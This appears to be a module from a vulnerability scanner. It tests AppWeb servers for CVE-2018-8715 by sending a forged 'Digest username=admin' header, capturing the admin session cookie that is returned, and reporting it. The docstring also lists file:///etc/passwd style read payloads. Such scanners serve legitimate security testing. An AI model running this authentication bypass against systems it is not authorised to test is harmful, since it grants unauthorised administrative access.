#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    AppWeb扫描类: 
        AppWeb 身份认证绕过
            CVE-2018-8715
                Payload: https://vulhub.org/#/environments/appweb/CVE-2018-8715/
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class AppWeb():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'AppWeb'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_8715_payloads = [                 # * 是不是很神奇, payload居然是空的
            {
                'path': '',
                'data': ''
            }
        ]

    def cve_2018_8715_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2018-8715'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {
            'Authorization': 'Digest username=admin'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2018_8715_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res1 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res1.status_code, res1)                        # * LOG

                if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):
                    try:
                        cookie = {
                            'Cookie': res1.headers['Set-Cookie']
                        }
                        headers.update(cookie)
                    except KeyError:
                        continue
                
                    res2 = requests.get(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False
                    )
                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                else:
                    return None
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('401' not in res2.text) and (('The Fast, Little Web Server' in res2.text) or ('Quick Start' in res2.text) or ('Appweb Resources and Useful Links' in res2.text) or ('Thanks, Embedthis Team.' in res2.text))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Cookie': cookie['Cookie']
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2018_8715_scan, url=url)
        ]

appweb = AppWeb()
